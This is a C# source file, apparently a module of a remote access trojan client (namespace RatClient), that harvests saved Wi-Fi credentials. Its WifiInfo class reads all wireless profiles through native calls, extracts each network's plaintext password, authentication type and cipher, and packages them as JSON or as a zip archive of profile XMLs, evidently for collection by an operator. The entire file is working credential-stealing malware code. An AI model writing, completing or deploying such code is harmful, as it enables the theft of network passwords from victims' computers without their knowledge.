using System;
using RatClient.WifiGather;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Xml;
using System.Text.Json;
using System.IO;
using System.Runtime.InteropServices.ComTypes;
using System.Text.RegularExpressions;

namespace RatClient.Mtool
{
	class WifiInfo
	{
		private XmlDocument xmlDoc;
		private string resultInfoFull;
		private string NameSpaceUrl;
		private XmlNamespaceManager namespaceManager;
		private WifiStringInfoParser parser;
		private const string NAME_SPACE = "ns";

		public WifiInfo()
		{
			xmlDoc = new XmlDocument();
			this.resultInfoFull = null;
			this.parser = null;
		}
		private void SetInfoFull()
		{
			IntPtr bufferPtr;
			int length;
			NativeMethods.getWifiProfiles(out bufferPtr, out length);
			byte[] data = new byte[length];
			Marshal.Copy(bufferPtr, data, 0, length);
			resultInfoFull = Encoding.UTF8.GetString(data);
			NativeMethods.deleteBuffer(bufferPtr);
		}
		private WifiuniqSerialized ParseProfile(string profileXml)
		{
			string SSIDName = GetSSID(profileXml);
			string Password = xmlDoc.SelectSingleNode($"//{NAME_SPACE}:keyMaterial", namespaceManager)?.InnerText ?? "";
			string Authentication = xmlDoc.SelectSingleNode($"//{NAME_SPACE}:authentication", namespaceManager)?.InnerText ?? "";
			string Cipher = xmlDoc.SelectSingleNode($"//{NAME_SPACE}:encryption", namespaceManager)?.InnerText ?? "";
			return new WifiuniqSerialized(SSIDName, Password, Authentication, Cipher);
		}

		private string GetSSID(string profile)
		{
			xmlDoc.LoadXml(profile);
			if (xmlDoc.DocumentElement.NamespaceURI != NameSpaceUrl)
			{
				NameSpaceUrl = xmlDoc.DocumentElement.NamespaceURI;
				namespaceManager = new XmlNamespaceManager(xmlDoc.NameTable);
				namespaceManager.AddNamespace("ns", xmlDoc.DocumentElement.NamespaceURI);
			}
			return xmlDoc.SelectSingleNode($"//{NAME_SPACE}:name", namespaceManager)?.InnerText ?? "";
		}

		private void basicInitializer()
		{
			if (resultInfoFull == null)
			{
				SetInfoFull();
				parser = new WifiStringInfoParser(resultInfoFull);
			}
		}
		public string GetJsonInfo()
		{
			basicInitializer();
			Dictionary<string, string[]> dictParsed = parser.ToDict();
			List<WifiInterfaceInfo> fullRes = new List<WifiInterfaceInfo>();
			foreach (string i in  dictParsed.Keys)
			{
				List<WifiuniqSerialized> profiles = new List<WifiuniqSerialized>();
				foreach (string n in dictParsed[i])
				{
					profiles.Add(ParseProfile(n));
				}
				WifiInterfaceInfo interfaceFull = new WifiInterfaceInfo(i, profiles.ToArray());
				fullRes.Add(interfaceFull);
			}
			WifiFullSerialized fullResSerialized = new WifiFullSerialized(fullRes.ToArray());
			return JsonSerializer.Serialize(fullResSerialized);
		}


		public byte[] FullReport()
		{
			basicInitializer();
			List<(string, List<string>)> tupleParsed = parser.ToTupleList();
			List<string> virtualPathes = new List<string>();
			List<MemoryStream> profilesStream = new List<MemoryStream>();
			string pattern = @"[^a-zA-Z0-9_\- ()]";
			foreach ((string, List<string>) i in tupleParsed)
			{
				string interfaceName = Regex.Replace(i.Item1, pattern, "_");
				foreach (string n in i.Item2)
				{
					MemoryStream profileMs = new MemoryStream(Encoding.UTF8.GetBytes(n));
					profilesStream.Add(profileMs);
					string profileName = Regex.Replace(GetSSID(n), pattern, "_");
					string virtualPath = $"{interfaceName}/{profileName}.xml";
					virtualPathes.Add(virtualPath);
				}
			}
			return Tools.ZipVirtualFolder(profilesStream, virtualPathes.ToArray());
		}
	}
}
